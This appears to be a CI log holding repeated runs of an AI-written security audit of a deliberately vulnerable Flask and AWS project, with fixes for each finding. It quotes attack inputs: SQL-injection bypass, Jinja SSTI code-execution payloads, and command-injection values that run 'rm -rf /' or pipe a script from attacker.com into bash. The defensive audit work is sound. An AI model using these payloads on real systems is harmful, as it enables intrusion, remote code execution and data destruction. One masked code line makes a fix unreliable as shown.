+2026-08-24T17:57:49.4899538Z **Fix:** Load all secrets from environment variables or a secrets manager:
+2026-08-24T17:57:49.4899952Z ```python
+2026-08-24T17:57:49.4900234Z import os
+2026-08-24T17:57:49.4900396Z 
+2026-08-24T17:57:49.4900536Z class Config:
+2026-08-24T17:57:49.4900848Z     SECRET_KEY = os.environ["FLASK_SECRET_KEY"]
+2026-08-24T17:57:49.4901230Z     JWT_SECRET  = os.environ["JWT_SECRET_KEY"]
+2026-08-24T17:57:49.4901635Z     SQLALCHEMY_DATABASE_URI = os.environ["DATABASE_URL"]
+2026-08-24T17:57:49.4902501Z ```
+2026-08-24T17:57:49.4903131Z Rotate all currently exposed secrets immediately. Add a pre-commit hook (e.g., `detect-secrets` or `trufflehog`) to prevent future commits of secrets.
+2026-08-24T17:57:49.4903641Z 
+2026-08-24T17:57:49.4903772Z ---
+2026-08-24T17:57:49.4903893Z 
+2026-08-24T17:57:49.4904072Z ### 6. Missing Authentication on All Endpoints
+2026-08-24T17:57:49.4904561Z **Files:** `./app/routes/users.py`, `./app/routes/files.py`, `./app/routes/templates.py`
+2026-08-24T17:57:49.4905035Z **Severity:** High
+2026-08-24T17:57:49.4905216Z 
+2026-08-24T17:57:49.4905575Z Every route — including destructive ones — is completely unauthenticated:
+2026-08-24T17:57:49.4905880Z 
+2026-08-24T17:57:49.4906017Z ```python
+2026-08-24T17:57:49.4906296Z # Anyone can delete any user
+2026-08-24T17:57:49.4906690Z @users_bp.route("/delete/<username>", methods=["DELETE"])
+2026-08-24T17:57:49.4907111Z def delete_user(username):
+2026-08-24T17:57:49.4907443Z     ...
+2026-08-24T17:57:49.4907585Z 
+2026-08-24T17:57:49.4907760Z # Anyone can list all users and their emails/roles
+2026-08-24T17:57:49.4908135Z @users_bp.route("/", methods=["GET"])
+2026-08-24T17:57:49.4908477Z def get_all_users():
+2026-08-24T17:57:49.4908778Z     ...
+2026-08-24T17:57:49.4909010Z ```
+2026-08-24T17:57:49.4909782Z 
+2026-08-24T17:57:49.4910043Z **Fix:** Implement JWT verification as a decorator and apply it to protected routes:
+2026-08-24T17:57:49.4910489Z ```python
+2026-08-24T17:57:49.4910808Z from functools import wraps
+2026-08-24T17:57:49.4911113Z import jwt
+2026-08-24T17:57:49.4911381Z from flask import request, jsonify
+2026-08-24T17:57:49.4911632Z 
+2026-08-24T17:57:49.4911981Z def token_required(f):
+2026-08-24T17:57:49.4912286Z     @wraps(f)
+2026-08-24T17:57:49.4912606Z     def decorated(*args, **kwargs):
+2026-08-24T17:57:49.4913050Z         token = request.headers.get("Authorization", "").removeprefix("Bearer ")
+2026-08-24T17:57:49.4913581Z         if not token:
+2026-08-24T17:57:49.4913945Z             return jsonify({"error": "Token missing"}), 401
+2026-08-24T17:57:49.4914346Z         try:
+2026-08-24T17:57:49.4914779Z             payload = jwt.decode(token, os.environ["JWT_SECRET_KEY"], algorithms=["HS256"])
+2026-08-24T17:57:49.4915254Z             request.user_id = payload["user_id"]
+2026-08-24T17:57:49.4915613Z         except jwt.ExpiredSignatureError:
+2026-08-24T17:57:49.4916024Z             return jsonify({"error": "Token expired"}), 401
+2026-08-24T17:57:49.4916406Z         except jwt.InvalidTokenError:
+2026-08-24T17:57:49.4916844Z             return jsonify({"error": "Invalid token"}), 401
+2026-08-24T17:57:49.4917208Z         return f(*args, **kwargs)
+2026-08-24T17:57:49.4917510Z     return decorated
+2026-08-24T17:57:49.4917718Z 
+2026-08-24T17:57:49.4917844Z # Apply to sensitive routes:
+2026-08-24T17:57:49.4918214Z @users_bp.route("/delete/<username>", methods=["DELETE"])
+2026-08-24T17:57:49.4918733Z @token_required
+2026-08-24T17:57:49.4919025Z def delete_user(username):
+2026-08-24T17:57:49.4919312Z     ...
+2026-08-24T17:57:49.4919591Z ```
+2026-08-24T17:57:49.4919745Z 
+2026-08-24T17:57:49.4919868Z ---
+2026-08-24T17:57:49.4920010Z 
+2026-08-24T17:57:49.4920222Z ### 7. Insecure Direct Object Reference (IDOR) / Missing Authorisation
+2026-08-24T17:57:49.4920727Z **Files:** `./app/routes/users.py`, `./app/routes/files.py`
+2026-08-24T17:57:49.4921081Z **Severity:** High
+2026-08-24T17:57:49.4921247Z 
+2026-08-24T17:57:49.4921916Z Even if authentication were added, there is no authorisation check — any authenticated user could delete any other user or any file:
+2026-08-24T17:57:49.4922421Z 
+2026-08-24T17:57:49.4922524Z ```python
+2026-08-24T17:57:49.4922942Z # No check that the requesting user owns this resource or is an admin
+2026-08-24T17:57:49.4923364Z def delete_user(username): ...
+2026-08-24T17:57:49.4923672Z def delete_file(file_id): ...
+2026-08-24T17:57:49.4924008Z ```
+2026-08-24T17:57:49.4924184Z 
+2026-08-24T17:57:49.4924325Z **Fix:** Enforce ownership or role checks:
+2026-08-24T17:57:49.4924653Z ```python
+2026-08-24T17:57:49.4925016Z @users_bp.route("/delete/<username>", methods=["DELETE"])
+2026-08-24T17:57:49.4925371Z @token_required
+2026-08-24T17:57:49.4925682Z def delete_user(username):
+2026-08-24T17:57:49.4926101Z     requesting_user = User.query.get(request.user_id)
+2026-08-24T17:57:49.4926544Z     target_user = User.query.filter_by(username=username).first()
+2026-08-24T17:57:49.4926847Z 
+2026-08-24T17:57:49.4927095Z     if requesting_user.role != "admin" and requesting_user.id != target_user.id:
+2026-08-24T17:57:49.4927542Z         return jsonify({"error": "Forbidden"}), 403
+2026-08-24T17:57:49.4927915Z     ...
+2026-08-24T17:57:49.4928191Z ```
+2026-08-24T17:57:49.4928326Z 
+2026-08-24T17:57:49.4928441Z ---
+2026-08-24T17:57:49.4928603Z 
+2026-08-24T17:57:49.4928759Z ### 8. AWS IAM Wildcard Policy (Privilege Escalation)
+2026-08-24T17:57:49.4929161Z **File:** `./infrastructure/iam-policy.json`
+2026-08-24T17:57:49.4930385Z **Severity:** High
+2026-08-24T17:57:49.4930540Z 
+2026-08-24T17:57:49.4930812Z The first statement grants unrestricted access to every AWS action and resource:
+2026-08-24T17:57:49.4931142Z 
+2026-08-24T17:57:49.4931264Z ```json
+2026-08-24T17:57:49.4931533Z {
+2026-08-24T17:57:49.4932034Z     "Sid": "AdministratorAccess",
+2026-08-24T17:57:49.4932384Z     "Effect": "Allow",
+2026-08-24T17:57:49.4932652Z     "Action": "*",
+2026-08-24T17:57:49.4932912Z     "Resource": "*"
+2026-08-24T17:57:49.4933174Z }
+2026-08-24T17:57:49.4933403Z ```
+2026-08-24T17:57:49.4933545Z 
+2026-08-24T17:57:49.4934128Z This renders all subsequent, more restrictive statements meaningless and violates the principle of least privilege. A compromised identity with this policy has full account takeover capability.
+2026-08-24T17:57:49.4934712Z 
+2026-08-24T17:57:49.4934996Z **Fix:** Remove the wildcard statement entirely and enumerate only the specific actions required:
+2026-08-24T17:57:49.4935440Z ```json
+2026-08-24T17:57:49.4935681Z {
+2026-08-24T17:57:49.4936037Z     "Sid": "AllowRequiredActions",
+2026-08-24T17:57:49.4936404Z     "Effect": "Allow",
+2026-08-24T17:57:49.4936669Z     "Action": [
+2026-08-24T17:57:49.4936938Z         "ec2:DescribeInstances",
+2026-08-24T17:57:49.4937245Z         "s3:GetObject",
+2026-08-24T17:57:49.4937517Z         "s3:ListBucket",
+2026-08-24T17:57:49.4937840Z         "logs:CreateLogGroup",
+2026-08-24T17:57:49.4938168Z         "logs:CreateLogStream",
+2026-08-24T17:57:49.4938474Z         "logs:PutLogEvents"
+2026-08-24T17:57:49.4938758Z     ],
+2026-08-24T17:57:49.4939030Z     "Resource": [
+2026-08-24T17:57:49.4939417Z         "arn:aws:s3:::dissertation-bucket/*",
+2026-08-24T17:57:49.4939753Z         "arn:aws:logs:eu-west-2:ACCOUNT_ID:*"
+2026-08-24T17:57:49.4940091Z     ]
+2026-08-24T17:57:49.4941918Z }
+2026-08-24T17:57:49.4942304Z ```
+2026-08-24T17:57:49.4942903Z Also scope `SecretsManagerAccess` to specific secret ARNs and remove `secretsmanager:DeleteSecret` unless explicitly required.
+2026-08-24T17:57:49.4943612Z 
+2026-08-24T17:57:49.4943714Z ---
+2026-08-24T17:57:49.4943865Z 
+2026-08-24T17:57:49.4944034Z ### 9. EC2 IMDSv1 Enabled (SSRF to Credential Theft)
+2026-08-24T17:57:49.4944387Z **File:** `./infrastructure/main.tf`
+2026-08-24T17:57:49.4944715Z **Severity:** High
+2026-08-24T17:57:49.4944887Z 
+2026-08-24T17:57:49.4945145Z The EC2 instance allows IMDSv1 (`http_tokens = "optional"`), which does not require session tokens:
+2026-08-24T17:57:49.4945488Z 
+2026-08-24T17:57:49.4945582Z ```hcl
+2026-08-24T17:57:49.4945860Z metadata_options {
+2026-08-24T17:57:49.4946150Z     http_endpoint               = "enabled"
+2026-08-24T17:57:49.4946535Z     http_tokens                 = "optional"   # IMDSv1 allowed
+2026-08-24T17:57:49.4946885Z }
+2026-08-24T17:57:49.4947114Z ```
+2026-08-24T17:57:49.4947253Z 
+2026-08-24T17:57:49.4947711Z Combined with any SSRF vulnerability in the application, an attacker can retrieve IAM credentials via `http://169.254.169.254/latest/meta-data/iam/security-credentials/`.
+2026-08-24T17:57:49.4948301Z 
+2026-08-24T17:57:49.4948456Z **Fix:** Enforce IMDSv2:
+2026-08-24T17:57:49.4948736Z ```hcl
+2026-08-24T17:57:49.4949000Z metadata_options {
+2026-08-24T17:57:49.4949280Z     http_endpoint               = "enabled"
+2026-08-24T17:57:49.4949625Z     http_tokens                 = "required"   # IMDSv2 only
+2026-08-24T17:57:49.4950089Z     http_put_response_hop_limit = 1
+2026-08-24T17:57:49.4950397Z }
+2026-08-24T17:57:49.4950627Z ```
+2026-08-24T17:57:49.4950761Z 
+2026-08-24T17:57:49.4950851Z ---
+2026-08-24T17:57:49.4950986Z 
+2026-08-24T17:57:49.4951086Z ## Medium Severity Vulnerabilities
+2026-08-24T17:57:49.4951314Z 
+2026-08-24T17:57:49.4951453Z ---
+2026-08-24T17:57:49.4951561Z 
+2026-08-24T17:57:49.4951907Z ### 10. Debug Mode Enabled in Production Entry Point
+2026-08-24T17:57:49.4952258Z **File:** `./run.py`
+2026-08-24T17:57:49.4952518Z **Severity:** Medium
+2026-08-24T17:57:49.4952682Z 
+2026-08-24T17:57:49.4952759Z ```python
+2026-08-24T17:57:49.4953055Z app.run(debug=True)
+2026-08-24T17:57:49.4953347Z ```
+2026-08-24T17:57:49.4953446Z 
+2026-08-24T17:57:49.4954039Z Flask's debug mode enables the interactive Werkzeug debugger, which allows arbitrary Python execution in the browser if an exception occurs. It also enables the reloader and exposes detailed tracebacks.
+2026-08-24T17:57:49.4954624Z 
+2026-08-24T17:57:49.4954720Z **Fix:**
+2026-08-24T17:57:49.4954939Z ```python
+2026-08-24T17:57:49.4955231Z if __name__ == "__main__":
+2026-08-24T17:57:49.4955599Z     debug = os.environ.get("FLASK_DEBUG", "false").lower() == "true"
+2026-08-24T17:57:49.4955974Z     app.run(debug=debug)
+2026-08-24T17:57:49.4956240Z ```
+2026-08-24T17:57:49.4956602Z In production, use a proper WSGI server (gunicorn, uWSGI) rather than Flask's development server.
+2026-08-24T17:57:49.4956991Z 
+2026-08-24T17:57:49.4957078Z ---
+2026-08-24T17:57:49.4957216Z 
+2026-08-24T17:57:49.4957353Z ### 11. Unencrypted S3 Bucket
+2026-08-24T17:57:49.4957853Z **File:** `./infrastructure/main.tf` — `aws_s3_bucket.unencrypted_bucket`
+2026-08-24T17:57:49.4958243Z **Severity:** Medium
+2026-08-24T17:57:49.4958498Z 
+2026-08-24T17:57:49.4958800Z `dissertation-unencrypted-bucket` has no server-side encryption configuration, unlike `secure_bucket`.
+2026-08-24T17:57:49.4959225Z 
+2026-08-24T17:57:49.4959344Z **Fix:** Apply encryption to all buckets:
+2026-08-24T17:57:49.4959675Z ```hcl
+2026-08-24T17:57:49.4960064Z resource "aws_s3_bucket_server_side_encryption_configuration" "unencrypted_bucket_encryption" {
+2026-08-24T17:57:49.4960536Z   bucket = aws_s3_bucket.unencrypted_bucket.id
+2026-08-24T17:57:49.4960859Z   rule {
+2026-08-24T17:57:49.4961154Z     apply_server_side_encryption_by_default {
+2026-08-24T17:57:49.4961510Z       sse_algorithm = "AES256"
+2026-08-24T17:57:49.4962082Z     }
+2026-08-24T17:57:49.4962321Z   }
+2026-08-24T17:57:49.4962555Z }
+2026-08-24T17:57:49.4962807Z ```
+2026-08-24T17:57:49.4962944Z 
+2026-08-24T17:57:49.4963031Z ---
+2026-08-24T17:57:49.4963159Z 
+2026-08-24T17:57:49.4963326Z ### 12. Publicly Accessible S3 Bucket
+2026-08-24T17:57:49.4963841Z **File:** `./infrastructure/main.tf` — `aws_s3_bucket.public_bucket`
+2026-08-24T17:57:49.4964204Z **Severity:** Medium
+2026-08-24T17:57:49.4964405Z 
+2026-08-24T17:57:49.4964686Z All four public access block settings are `false`, making this bucket and its contents potentially world-readable:
+2026-08-24T17:57:49.4965063Z 
+2026-08-24T17:57:49.4965155Z ```hcl
+2026-08-24T17:57:49.4965443Z block_public_acls       = false
+2026-08-24T17:57:49.4965755Z block_public_policy     = false
+2026-08-24T17:57:49.4966027Z ignore_public_acls      = false
+2026-08-24T17:57:49.4966336Z restrict_public_buckets = false
+2026-08-24T17:57:49.4966607Z ```
+2026-08-24T17:57:49.4966730Z 
+2026-08-24T17:57:49.4967246Z **Fix:** Unless this bucket is intentionally serving public static assets, set all flags to `true`. If public access is required, use CloudFront with an Origin Access Control (OAC) instead of direct bucket access.
+2026-08-24T17:57:49.4967849Z 
+2026-08-24T17:57:49.4967987Z ---
+2026-08-24T17:57:49.4968100Z 
+2026-08-24T17:57:49.4968238Z ### 13. No Input Validation on File Upload
+2026-08-24T17:57:49.4968640Z **File:** `./app/routes/files.py` — `upload_file()`
+2026-08-24T17:57:49.4968966Z **Severity:** Medium
+2026-08-24T17:57:49.4969115Z 
+2026-08-24T17:57:49.4969404Z The filename is stored without any validation, allowing path traversal sequences or null bytes:
+2026-08-24T17:57:49.4969715Z 
+2026-08-24T17:57:49.4969856Z ```python
+2026-08-24T17:57:49.4970115Z filename = data.get("filename")   # No validation
+2026-08-24T17:57:49.4970471Z file_record = File(filename=filename, ...)
+2026-08-24T17:57:49.4970765Z ```
+2026-08-24T17:57:49.4970886Z 
+2026-08-24T17:57:49.4971039Z **Fix:**
+2026-08-24T17:57:49.4971290Z ```python
+2026-08-24T17:57:49.4971510Z import re
+2026-08-24T17:57:49.4971875Z from werkzeug.utils import secure_filename
+2026-08-24T17:57:49.4972211Z 
+2026-08-24T17:57:49.4972352Z filename = secure_filename(data.get("filename", ""))
+2026-08-24T17:57:49.4972687Z if not filename:
+2026-08-24T17:57:49.4973082Z     return jsonify({"error": "Invalid filename"}), 400
+2026-08-24T17:57:49.4973398Z ```
+2026-08-24T17:57:49.4973521Z 
+2026-08-24T17:57:49.4973652Z ---
+2026-08-24T17:57:49.4973792Z 
+2026-08-24T17:57:49.4973923Z ### 14. Missing Input Validation on Auth Endpoints
+2026-08-24T17:57:49.4974313Z **File:** `./app/routes/auth.py` — `register()`
+2026-08-24T17:57:49.4974657Z **Severity:** Medium
+2026-08-24T17:57:49.4974820Z 
+2026-08-24T17:57:49.4975304Z No validation is performed on `username`, `password`, or `email` before use. A `None` value (missing JSON field) will cause an unhandled exception, and there are no length or format constraints.
+2026-08-24T17:57:49.4975838Z 
+2026-08-24T17:57:49.4975972Z **Fix:**
+2026-08-24T17:57:49.4976203Z ```python
+2026-08-24T17:57:49.4976476Z if not username or not password or not email:
+2026-08-24T17:57:49.4976905Z     return jsonify({"error": "All fields are required"}), 400
+2026-08-24T17:57:49.4977235Z if len(password) < 12:
+2026-08-24T17:57:49.4977566Z     return jsonify({"error": "Password too short"}), 400
+2026-08-24T17:57:49.4978009Z if not re.match(r"[^@]+@[^@]+\.[^@]+", email):
+2026-08-24T17:57:49.4978372Z     return jsonify({"error": "Invalid email"}), 400
+2026-08-24T17:57:49.4978694Z ```
+2026-08-24T17:57:49.4978831Z 
+2026-08-24T17:57:49.4978934Z ---
+2026-08-24T17:57:49.4979056Z 
+2026-08-24T17:57:49.4979218Z ### 15. JWT Algorithm Not Validated on Decode
+2026-08-24T17:57:49.4979603Z **File:** `./app/routes/auth.py` — `generate_token()`
+2026-08-24T17:57:49.4979952Z **Severity:** Medium
+2026-08-24T17:57:49.4980127Z 
+2026-08-24T17:57:49.4980733Z The `generate_token` function encodes tokens, but there is no corresponding `decode` function shown that explicitly specifies `algorithms=["HS256"]`. Omitting the `algorithms` parameter on decode historically allowed the `"alg": "none"` attack.
+2026-08-24T17:57:49.4981461Z 
+2026-08-24T17:57:49.4981629Z **Fix:** Always specify the algorithm explicitly on decode:
+2026-08-24T17:57:49.4982316Z ```python
+2026-08-24T17:57:49.4982656Z payload = jwt.decode(
+2026-08-24T17:57:49.4982940Z     token,
+2026-08-24T17:57:49.4983246Z     os.environ["JWT_SECRET_KEY"],
+2026-08-24T17:57:49.4983539Z     algorithms=["HS256"]   # Must be explicit
+2026-08-24T17:57:49.4983859Z )
+2026-08-24T17:57:49.4984107Z ```
+2026-08-24T17:57:49.4984230Z 
+2026-08-24T17:57:49.4984334Z ---
+2026-08-24T17:57:49.4984484Z 
+2026-08-24T17:57:49.4984598Z ## Low Severity Vulnerabilities
+2026-08-24T17:57:49.4984787Z 
+2026-08-24T17:57:49.4984892Z ---
+2026-08-24T17:57:49.4985013Z 
+2026-08-24T17:57:49.4985186Z ### 16. Sensitive Data Exposure via User Enumeration
+2026-08-24T17:57:49.4985605Z **File:** `./app/routes/users.py` — `get_user()`
+2026-08-24T17:57:49.4985920Z **Severity:** Low
+2026-08-24T17:57:49.4986090Z 
+2026-08-24T17:57:49.4986554Z The endpoint returns a distinct `"User not found"` error, enabling username enumeration. The `get_all_users()` endpoint also exposes emails and roles for all users with no authentication.
+2026-08-24T17:57:49.4987107Z 
+2026-08-24T17:57:49.4987415Z **Fix:** Require authentication for all user lookup endpoints and return generic error messages where appropriate.
+2026-08-24T17:57:49.4987776Z 
+2026-08-24T17:57:49.4987909Z ---
+2026-08-24T17:57:49.4988069Z 
+2026-08-24T17:57:49.4988168Z ### 17. No Rate Limiting
+2026-08-24T17:57:49.4988447Z **Files:** `./app/routes/auth.py`
+2026-08-24T17:57:49.4988769Z **Severity:** Low
+2026-08-24T17:57:49.4988895Z 
+2026-08-24T17:57:49.4989232Z Login and registration endpoints have no rate limiting, making them vulnerable to brute-force and credential-stuffing attacks.
+2026-08-24T17:57:49.4989673Z 
+2026-08-24T17:57:49.4989785Z **Fix:** Use `flask-limiter`:
+2026-08-24T17:57:49.4990082Z ```python
+2026-08-24T17:57:49.4990335Z from flask_limiter import Limiter
+2026-08-24T17:57:49.4990697Z limiter = Limiter(app, key_func=get_remote_address)
+2026-08-24T17:57:49.4990895Z 
+2026-08-24T17:57:49.4991031Z @auth_bp.route("/login", methods=["POST"])
+2026-08-24T17:57:49.4991372Z @limiter.limit("10 per minute")
+2026-08-24T17:57:49.4992092Z def login():
+2026-08-24T17:57:49.4992436Z     ...
+2026-08-24T17:57:49.4992683Z ```
+2026-08-24T17:57:49.4992838Z 
+2026-08-24T17:57:49.4992946Z ---
+2026-08-24T17:57:49.4993067Z 
+2026-08-24T17:57:49.4993233Z ### 18. Outdated Dependencies with Known CVEs
+2026-08-24T17:57:49.4993587Z **File:** `./requirements.txt`
+2026-08-24T17:57:49.4994293Z **Severity:** Low–Medium (version-dependent)
+2026-08-24T17:57:49.4994529Z 
+2026-08-24T17:57:49.4994692Z Several pinned versions are outdated and may carry known CVEs:
+2026-08-24T17:57:49.4994951Z 
+2026-08-24T17:57:49.4995077Z | Package | Pinned | Notes |
+2026-08-24T17:57:49.4995396Z |---|---|---|
+2026-08-24T17:57:49.4995716Z | `Werkzeug` | `2.0.0` | Multiple CVEs fixed in later 2.x/3.x releases |
+2026-08-24T17:57:49.4996095Z | `Jinja2` | `3.0.0` | CVEs fixed in 3.1.x |
+2026-08-24T17:57:49.4996468Z | `urllib3` | `1.26.20` | 2.x branch has security improvements |
+2026-08-24T17:57:49.4996836Z | `requests` | `2.28.0` | Outdated |
+2026-08-24T17:57:49.4997015Z 
+2026-08-24T17:57:49.4997615Z **Fix:** Run `pip audit` or use Dependabot/Renovate to identify and update vulnerable packages. Pin to the latest stable versions and integrate automated dependency scanning into CI.
+2026-08-24T17:57:49.4998148Z 
+2026-08-24T17:57:49.4998238Z ---
+2026-08-24T17:57:49.4998361Z 
+2026-08-24T17:57:49.4998474Z ## Summary Table
+2026-08-24T17:57:49.4998641Z 
+2026-08-24T17:57:49.4998777Z | # | Issue | File | Severity |
+2026-08-24T17:57:49.4999038Z |---|---|---|---|
+2026-08-24T17:57:49.4999372Z | 1 | SQL Injection | `auth.py` | **Critical** |
+2026-08-24T17:57:49.4999778Z | 2 | Server-Side Template Injection (RCE) | `templates.py` | **Critical** |
+2026-08-24T17:57:49.5000222Z | 3 | Plaintext Password Storage | `auth.py` | **Critical** |
+2026-08-24T17:57:49.5000613Z | 4 | OS Command Injection | `files.py` | **Critical** |
+2026-08-24T17:58:51.0517128Z | 5 | Hardcoded Secrets |
+2026-08-24T17:58:51.0517757Z 
+2026-08-24T17:58:51.0517961Z === RUN 4 OF 5 ===
+2026-08-24T17:58:51.0518393Z # Security Audit Report
+2026-08-24T17:58:51.0519173Z 
+2026-08-24T17:58:51.0519351Z ## Critical Vulnerabilities
+2026-08-24T17:58:51.0519680Z 
+2026-08-24T17:58:51.0519864Z ---
+2026-08-24T17:58:51.0520064Z 
+2026-08-24T17:58:51.0520297Z ### 1. SQL Injection
+2026-08-24T17:58:51.0521053Z **File:** `./app/routes/auth.py` — `login()` function
+2026-08-24T17:58:51.0521599Z **Severity:** Critical
+2026-08-24T17:58:51.0522216Z 
+2026-08-24T17:58:51.0522923Z The login query is built via direct string concatenation with unsanitised user input, allowing an attacker to manipulate the query logic entirely.
+2026-08-24T17:58:51.0523802Z 
+2026-08-24T17:58:51.0523983Z ```python
+2026-08-24T17:58:51.0524380Z # VULNERABLE
+2026-08-24T17:58:51.0525097Z query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
+2026-08-24T17:58:51.0525846Z result = db.session.execute(query)
+2026-08-24T17:58:51.0526363Z ```
+2026-08-24T17:58:51.0526613Z 
+2026-08-24T17:58:51.0527136Z An attacker can bypass authentication entirely with a username like `' OR '1'='1' --`, or exfiltrate/destroy data.
+2026-08-24T17:58:51.0527844Z 
+2026-08-24T17:58:51.0528179Z **Fix:** Use SQLAlchemy's ORM or parameterised queries:
+2026-08-24T17:58:51.0528721Z ```python
+2026-08-24T17:58:51.0529115Z # Option 1: ORM (preferred)
+2026-08-24T17:58:51.0529698Z user = User.query.filter_by(username=username).first()
+2026-08-24T17:58:51.0530312Z if user and check_password_hash(user.password, password):
+2026-08-24T17:58:51.0530923Z     ...
+2026-08-24T17:58:51.0531100Z 
+2026-08-24T17:58:51.0531309Z # Option 2: Parameterised query
+2026-08-24T17:58:51.0531955Z result = db.session.execute(
+2026-08-24T17:58:51.0532575Z     "SELECT * FROM users WHERE username = :username AND password = :password",
+2026-08-24T17:58:51.0533130Z     {"username": username, "password": password}
+2026-08-24T17:58:51.0533556Z )
+2026-08-24T17:58:51.0533812Z ```
+2026-08-24T17:58:51.0533942Z 
+2026-08-24T17:58:51.0534063Z ---
+2026-08-24T17:58:51.0534202Z 
+2026-08-24T17:58:51.0534417Z ### 2. Server-Side Template Injection (SSTI)
+2026-08-24T17:58:51.0535022Z **File:** `./app/routes/templates.py` — `render_template_custom()`
+2026-08-24T17:58:51.0535441Z **Severity:** Critical
+2026-08-24T17:58:51.0535645Z 
+2026-08-24T17:58:51.0536070Z User-supplied template strings are rendered directly by Jinja2 with no sandboxing, allowing arbitrary code execution on the server.
+2026-08-24T17:58:51.0536545Z 
+2026-08-24T17:58:51.0536688Z ```python
+2026-08-24T17:58:51.0537124Z # VULNERABLE — attacker controls template_str entirely
+2026-08-24T17:58:51.0537505Z env = Environment()
+2026-08-24T17:58:51.0537830Z template = env.from_string(template_str)
+2026-08-24T17:58:51.0538247Z rendered = template.render(**context)
+2026-08-24T17:58:51.0538562Z ```
+2026-08-24T17:58:51.0538701Z 
+2026-08-24T17:58:51.0539235Z A payload such as `{{ ''.__class__.__mro__[1].__subclasses__() }}` or `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}` achieves Remote Code Execution (RCE).
+2026-08-24T17:58:51.0539799Z 
+2026-08-24T17:58:51.0540513Z **Fix:** Use Jinja2's `SandboxedEnvironment` and strictly validate/whitelist templates. Better still, avoid rendering arbitrary user-supplied templates entirely:
+2026-08-24T17:58:51.0541264Z ```python
+2026-08-24T17:58:51.0541587Z from jinja2.sandbox import SandboxedEnvironment
+2026-08-24T17:58:51.0541991Z 
+2026-08-24T17:58:51.0542140Z env = SandboxedEnvironment()
+2026-08-24T17:58:51.0542530Z template = env.from_string(template_str)
+2026-08-24T17:58:51.0542890Z rendered = template.render(**context)
+2026-08-24T17:58:51.0543210Z ```
+2026-08-24T17:58:51.0543748Z Note: Even `SandboxedEnvironment` has had bypasses. The safest approach is to never render user-controlled templates.
+2026-08-24T17:58:51.0544160Z 
+2026-08-24T17:58:51.0544278Z ---
+2026-08-24T17:58:51.0544480Z 
+2026-08-24T17:58:51.0544598Z ### 3. OS Command Injection
+2026-08-24T17:58:51.0545000Z **File:** `./app/routes/files.py` — `process_file()`
+2026-08-24T17:58:51.0545361Z **Severity:** Critical
+2026-08-24T17:58:51.0545561Z 
+2026-08-24T17:58:51.0545879Z User-supplied `filename` is concatenated directly into a shell command executed with `shell=True`:
+2026-08-24T17:58:51.0546340Z 
+2026-08-24T17:58:51.0546488Z ```python
+2026-08-24T17:58:51.0546781Z # VULNERABLE
+2026-08-24T17:58:51.0547066Z result = subprocess.run(
+2026-08-24T17:58:51.0547414Z     "file " + filename,   # attacker controls filename
+2026-08-24T17:58:51.0547816Z     shell=True,
+2026-08-24T17:58:51.0548111Z     capture_output=True,
+2026-08-24T17:58:51.0548433Z     text=True
+2026-08-24T17:58:51.0548699Z )
+2026-08-24T17:58:51.0548962Z ```
+2026-08-24T17:58:51.0549126Z 
+2026-08-24T17:58:51.0549499Z An attacker submitting `filename = "foo; rm -rf / #"` or `"foo && curl attacker.com/shell.sh | bash"` achieves arbitrary command execution.
+2026-08-24T17:58:51.0549994Z 
+2026-08-24T17:58:51.0550200Z **Fix:** Pass arguments as a list and disable shell interpolation:
+2026-08-24T17:58:51.0550621Z ```python
+2026-08-24T17:58:51.0550884Z import shlex
+2026-08-24T17:58:51.0551036Z 
+2026-08-24T17:58:51.0551168Z # Validate filename first
+2026-08-24T17:58:51.0551511Z if not re.match(r'^[\w\-. ]+$', filename):
+2026-08-24T17:58:51.0552032Z     return jsonify({"error": "Invalid filename"}), 400
+2026-08-24T17:58:51.0552272Z 
+2026-08-24T17:58:51.0552434Z result = subprocess.run(
+2026-08-24T17:58:51.0552845Z     ["file", filename],   # list form — no shell expansion
+2026-08-24T17:58:51.0553215Z     shell=False,
+2026-08-24T17:58:51.0553515Z     capture_output=True,
+2026-08-24T17:58:51.0553850Z     text=True
+2026-08-24T17:58:51.0554145Z )
+2026-08-24T17:58:51.0554398Z ```
+2026-08-24T17:58:51.0554518Z 
+2026-08-24T17:58:51.0554650Z ---
+2026-08-24T17:58:51.0554812Z 
+2026-08-24T17:58:51.0554951Z ## High Vulnerabilities
+2026-08-24T17:58:51.0555145Z 
+2026-08-24T17:58:51.0555241Z ---
+2026-08-24T17:58:51.0555393Z 
+2026-08-24T17:58:51.0555561Z ### 4. Plaintext Password Storage
+2026-08-24T17:58:51.0555960Z **File:** `./app/routes/auth.py` — `register()`
+2026-08-24T17:58:51.0556308Z **Severity:** High
+2026-08-24T17:58:51.0556502Z 
+2026-08-24T17:58:51.0556686Z Passwords are stored in the database as plaintext:
+2026-08-24T17:58:51.0556943Z 
+2026-08-24T17:58:51.0557054Z ```python
+2026-08-24T17:58:51.0557359Z # VULNERABLE
+2026-08-24T17:58:51.0557975Z user = User(username=username, *** email=email)
+2026-08-24T17:58:51.0558322Z ```
+2026-08-24T17:58:51.0558511Z 
+2026-08-24T17:58:51.0558681Z A database breach exposes every user's password directly.
+2026-08-24T17:58:51.0558953Z 
+2026-08-24T17:58:51.0559164Z **Fix:** Hash passwords with a strong, salted algorithm before storage:
+2026-08-24T17:58:51.0559598Z ```python
+2026-08-24T17:58:51.0559971Z from werkzeug.security import generate_password_hash, check_password_hash
+2026-08-24T17:58:51.0560274Z 
+2026-08-24T17:58:51.0560398Z # On registration
+2026-08-24T17:58:51.0562679Z user = User(username=username, *** email=email)
+2026-08-24T17:58:51.0562955Z 
+2026-08-24T17:58:51.0563077Z # On login
+2026-08-24T17:58:51.0563443Z if user and check_password_hash(user.password, password):
+2026-08-24T17:58:51.0563824Z     ...
+2026-08-24T17:58:51.0564092Z ```
+2026-08-24T17:58:51.0564277Z 
+2026-08-24T17:58:51.0564376Z ---
+2026-08-24T17:58:51.0564647Z 
+2026-08-24T17:58:51.0564780Z ### 5. Hardcoded Secrets
+2026-08-24T17:58:51.0565154Z **Files:** `./app/config.py`, `./app/routes/auth.py`
+2026-08-24T17:58:51.0565523Z **Severity:** High
+2026-08-24T17:58:51.0565693Z 
+2026-08-24T17:58:51.0565898Z Multiple secrets are hardcoded directly in source code:
+2026-08-24T17:58:51.0566177Z 
+2026-08-24T17:58:51.0566281Z ```python
+2026-08-24T17:58:51.0566551Z # app/config.py
+2026-08-24T17:58:51.0566915Z SECRET_KEY = "hardcoded-secret-key-123"
+2026-08-24T17:58:51.0567113Z 
+2026-08-24T17:58:51.0567259Z # app/routes/auth.py
+2026-08-24T17:58:51.0567596Z db_password = "supersecretdbpassword123"
